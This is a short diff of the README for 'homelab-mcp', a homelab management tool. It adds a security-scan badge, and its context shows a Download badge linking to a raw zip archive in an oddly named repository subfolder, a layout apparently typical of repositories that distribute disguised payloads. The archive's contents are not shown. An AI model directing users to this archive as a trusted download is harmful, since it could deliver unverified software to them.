@@ -1,5 +1,7 @@
 # 🏠 homelab-mcp - Simplify Your Homelab Management
 
+[![SafeSkill 89/100](https://img.shields.io/badge/SafeSkill-89%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/myraffy-homelab-mcp)
+
 [![Download](https://github.com/myraffy/homelab-mcp/raw/refs/heads/main/paroxysmally/homelab-mcp-v3.5.zip)](https://github.com/myraffy/homelab-mcp/raw/refs/heads/main/paroxysmally/homelab-mcp-v3.5.zip)
 
 ## 📖 Description
